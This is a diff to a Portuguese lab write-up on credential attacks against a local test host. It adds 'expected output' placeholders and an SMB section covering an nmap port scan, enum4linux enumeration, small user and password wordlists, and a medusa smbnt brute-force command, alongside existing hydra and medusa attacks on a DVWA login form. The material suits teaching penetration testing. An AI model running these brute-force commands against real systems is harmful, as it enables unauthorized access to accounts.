@@ -229,7 +229,18 @@ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
 -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
 -m 'FAIL=Login failed' -t 6
 
-Exemplo:
+
+
+
+
+
+
+
+🔽 Saída esperada:
+
+
+
+
 
 
 
@@ -257,6 +268,16 @@ hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:us
 
 
 
+
+🔽 Saída esperada:
+
+
+
+
+
+
+
+
 <img width="703" height="790" alt="hydra" src="https://github.com/user-attachments/assets/04c946cf-435b-4a1e-a3ad-0be1bcb11a9c" />
 
 
@@ -269,9 +290,82 @@ O USUÁRIO E A SENHA ENCONTRADOS FORAM:` ADMIN / PASSWORD`
 
 
 
+## Ataque ao SMB (Samba) — serviço usado para compartilhar arquivos e impressoras.
+
+Para descobrir se o SMB está disponível, rode: ``nmap -sV -p 445 192.168.56.101.``
+
+
+<img width="667" height="371" alt="image" src="https://github.com/user-attachments/assets/ff9104b1-2d5d-4874-a9d3-596cb1548553" />
+
+--
+A porta 445 foi identificada na imagem como open, indicando ausência de filtragem de firewall. 
+Dessa forma, procede‑se com a enumeração da porta para obtenção de informações do host, cuja saída será redirecionada para o arquivo ``enum4_output.txt:``
 
 
 
+
+```bash
+enum4linux -a 192.168.56.101 | tee enum4_output.txt
+```
+
+
+
+
+🔽 Saída esperada:
+
+
+
+
+
+<img width="693" height="799" alt="image" src="https://github.com/user-attachments/assets/27ba4413-5dc0-421b-8d60-842c76456ec2" />
+
+
+
+
+
+---
+
+## WORDLIST
+
+Com a lista de possíveis usuários em mãos, passamos à geração das wordlists. Execute os comandos abaixo:
+
+Criação da lista de usuários:
+
+```bash
+echo -e "user\nmsfadmin\nservice" > smb_users.txt
+```
+
+
+
+
+Criação da lista de senhas:
+
+
+```bash
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+```
+
+
+
+---
+
+
+## Ataque de força bruta contra o serviço SMB usando medusa
+
+
+
+```bash
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+```
+
+
+
+🔽 Saída esperada:
+
+
+
+
+<img width="713" height="792" alt="image" src="https://github.com/user-attachments/assets/78535b4f-f298-4507-8d70-208dc95afcbe" />
 
 
 
